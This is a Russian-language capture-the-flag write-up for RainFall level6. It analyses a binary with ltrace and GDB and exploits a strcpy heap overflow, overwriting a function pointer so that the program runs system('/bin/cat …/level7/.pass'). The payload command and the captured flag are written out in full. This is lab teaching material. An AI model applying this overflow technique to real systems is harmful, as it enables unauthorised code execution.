# Решение
python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /tmp/destroy2
./level6 `cat /tmp/destroy2`


# Объяснение

1. Анализируем поведение программы
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)

level6@RainFall:~$ ./level6 A
Nope

level6@RainFall:~$ python -c 'print "A"*72' > /tmp/t
level6@RainFall:~$ ./level6  `cat /tmp/t`
Segmentation fault (core dumped)


Требует аргумента командной строки, без него происходит segfault.
Если количество введенных символов 72 или более, также происходит segfault.

2. ltrace
level6@RainFall:~$ ltrace ./level6
__libc_start_main(0x804847c, 1, 0xbffff6f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                        = 0x0804a008
malloc(4)                         = 0x0804a050
strcpy(0x0804a008, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

level6@RainFall:~$ ltrace ./level6 A
__libc_start_main(0x804847c, 2, 0xbffff6f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                        = 0x0804a008
malloc(4)                         = 0x0804a050
strcpy(0x0804a008, "A")           = 0x0804a008
puts("Nope"Nope
)                      = 5
+++ exited (status 5) +++


Вызывается strcpy с аргументом src - нашим вводом. Функция strcpy(dst, src) небезопасна, так как переписывает память из
src в dst не учитывая длину dst, что может вызвать перезапись памяти.

3. GDB

(gdb) disas main

   0x0804847c <+0>:	    push   %ebp                   // пролог
   0x0804847d <+1>:	    mov    %esp,%ebp
   0x0804847f <+3>:	    and    $0xfffffff0,%esp       // устанавливаем вершину стека на 0xfffffff0
   0x08048482 <+6>:	    sub    $0x20,%esp             // выделяем 32 байта на стеке
   0x08048485 <+9>:	    movl   $0x40,(%esp)           // кладем значение 64(4 байта) на вершину стеке. (аргумент)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt> // вызываем функцию malloc с аргументом 64
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)        // кладем адрес, выделенной malloc, памяти на стек
   0x08048495 <+25>:	movl   $0x4,(%esp)            // кладем значение 4(4 байта) на стек (аргумент)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt> // вызываес malloc с аргументом 4
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)        // кладем адрес, выделенный malloc, в стек
   0x080484a5 <+41>:	mov    $0x8048468,%edx        // кладем адрес функции m в регистр EDX
   0x080484aa <+46>:	mov    0x18(%esp),%eax        // перекладываем адрес, возвращенный вторым malloc, в EAX
   0x080484ae <+50>:	mov    %edx,(%eax)            // кладем адрес функции m из регистра EDX по адресу, лежащему в EAX
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax         // адрес argv[1] помещаем в EAX
   0x080484b3 <+55>:	add    $0x4,%eax              // значение 4 помещается в EAX
   0x080484b6 <+58>:	mov    (%eax),%eax            // адрес EAX помещается в EAX
   0x080484b8 <+60>:	mov    %eax,%edx              // адрес числа 4 помещается в EDX
   0x080484ba <+62>:	mov    0x1c(%esp),%eax        // помещаем адрес, возвращенный первым malloc, в EAX
   0x080484be <+66>:	mov    %edx,0x4(%esp)         // адрес числа 4 кладем на стек
   0x080484c2 <+70>:	mov    %eax,(%esp)            // Помещаем адрес из первого malloc на стек
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> // вызываем strcpy с аргументами
   0x080484ca <+78>:	mov    0x18(%esp),%eax        // помещаем адрес из второго malloc в EAX
   0x080484ce <+82>:	mov    (%eax),%eax            // адрес, указывающий на адрес из второго malloc, помещаем в EAX
   0x080484d0 <+84>:	call   *%eax                  // вызываем то, что лежит в EAX
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret

Из функции main мы понимаем, что в поинтер кладется адрес функции m, затем она вызывается. память под этот
поинтер выделяется во втором malloc. После этого происходит запись в память, выделенную первым malloc, значений
из argv[1].

(gdb) disas m
   0x08048468 <+0>:	    push   %ebp                  // пролог
   0x08048469 <+1>:	    mov    %esp,%ebp
   0x0804846b <+3>:	    sub    $0x18,%esp            // выделяется 24 байта на стеке
   0x0804846e <+6>:	    movl   $0x80485d1,(%esp)     // на вершину стека кладется строка "Nope" (x/5cb 0x80485d1)
   0x08048475 <+13>:	call   0x8048360 <puts@plt>  // вызывается функция puts с аргументом "Nope"
   0x0804847a <+18>:	leave
   0x0804847b <+19>:	ret

В данной функции просто вызывается puts("Nope"). Надо бы ее сменить....на функцию n

(gdb) disas n
   0x08048454 <+0>:	    push   %ebp                    // пролог
   0x08048455 <+1>:	    mov    %esp,%ebp
   0x08048457 <+3>:	    sub    $0x18,%esp              // выделяем 24 байта на стеке
   0x0804845a <+6>:	    movl   $0x80485b0,(%esp)       // кладем на стек строку "/bin/cat /home/user/level7/.pass" (x/33cb 0x80485b0)
   0x08048461 <+13>:	call   0x8048370 <system@plt>  // выполняем вызов функции system с аргументом "/bin/cat /home/user/level7/.pass"
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret

В функции n происхдит вызов system("/bin/cat /home/user/level7/.pass"). То. что нам нужно.

4. Взлом

Задача: перезаписать адрес в указателе (из 2го malloc) с функции m на функцию n с помощью уязвимости strcpy.

В функции main malloc выделяет память последовательно. То есть адрес указателя из второго malloc будет на определенное
количество байт больше, чем адрес указателя из первого malloc. Разницу будет составлять выделенная память + служебная информация.


Посмотрим, какая разница между адресами.

Адрес, возвращенный первым malloc.
(gdb) x/x $esp+0x1c
0xbffff62c:	0x0804a008 -- адрес1

Адрес, возвращенный вторым malloc.
(gdb) x/x $esp+0x18
0xbffff628:	0x0804a050 -- адрес2

(gdb) p/d 0x0804a050 - 0x0804a008
$3 = 72

Разница в байтах между первым и вторым указателем = 72.


Готовим полезную нагрузку:
Передадим как аргумент программы строку с 72 символами + адрес функции n(0x08048454) в порядке little-endian.
python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /tmp/destroy2

Ломаем:
level6@RainFall:~$ ./level6 `cat /tmp/destroy2`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

